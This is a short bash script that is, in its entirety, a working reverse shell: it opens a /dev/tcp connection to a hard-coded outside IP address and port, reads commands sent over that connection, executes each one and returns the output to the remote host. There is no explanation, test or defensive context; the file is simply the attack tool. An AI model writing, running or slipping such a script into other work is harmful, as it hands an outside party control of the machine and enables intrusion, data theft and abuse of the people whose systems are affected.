#!/bin/bash

exec 5<>/dev/tcp/206.189.215.73/24119
cat <&5 | while read line; do $line 2>&5 >&5; done
